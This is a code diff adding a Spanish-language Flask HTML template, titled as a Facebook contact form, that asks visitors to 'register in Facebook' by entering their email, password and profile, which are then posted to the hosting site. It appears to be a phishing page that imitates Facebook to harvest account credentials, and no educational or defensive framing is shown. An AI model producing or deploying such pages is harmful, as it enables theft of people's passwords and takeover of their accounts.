@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width-device-width, initial-scale-1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<title> Formulario De Contacto De Facebook</title>
+
+	<link rel="stylesheet" href="{{ url_for('static', filename = 'css/bootstrap.css')}}">
+	<link rel="stylesheet"  href="{{ url_for('static', filename = 'css/estilo.css')}}">
+	<link rel="stylesheet"  href="{{url_for('static', filename = 'css/font-awesome.css')}}">
+
+	</head>
+<body>
+	<div id="particles-js"></div>	
+
+	<script src="{{ url_for('static', filename = 'js/jquery-3.3.1.js')}}"></script>
+	<script src="{{ url_for('static', filename = 'js/script.js')}}"></script>
+
+	<script src="{{ url_for('static', filename = 'js/particles.js')}}"></script>
+	<script src="{{ url_for('static', filename = 'js/app.js')}}"></script>
+	<script src="{{ url_for('static', filename = 'js/lib/stats.js')}}"></script>
+
+
+	<section class="form_wrap2 container">
+
+		<div class="container row col-md-12">
+			<section class="col-md-9">
+		<h2> Entre sus datos para Registrarse en Facebook</h2>
+		
+				<div class="modal-dialog text-center">
+					<div class="col-sm-8 main-section">
+						<div class="modal-content">
+							<div class="col-12 user-img">
+									<img src="{{url_for('static', filename= 'img/face.gif')}}">	
+							</div>
+							<form class="col-12" method="post">
+								<div class="form-group">
+									<input type="text" id= "email" name= "email" class="form-control" placeholder="Enter email" required>				
+								</div>
+								<div class="form-group">
+									<input type="password" id= "passw" name= "passw" class="form-control" placeholder="Enter Password" required>				
+								</div>
+								<div class="form-group">
+									<input type="text" id= "profie" name= "profile" class="form-control" placeholder="Enter Profile" required>				
+								</div>
+								<input type="submit" value="Registrarse" class="btn" onclick="'/facebook/'">					
+								
+							</form>							
+						</div>
+						
+				</div>
+			</section>
+			<form class=" " method="post">
+					<div class="col-md-3 mysearch" id="Register">
+							<input type="submit" value="Ya esta registrado" id="btnSend" onclick="/facebook/">
+						</div>
+					</div>	
+			</form>
+			
+
+	</section>
+	<a class="mysearch" href="/"><h3>Inicio</h3></a>	 
+</body>
+</html>
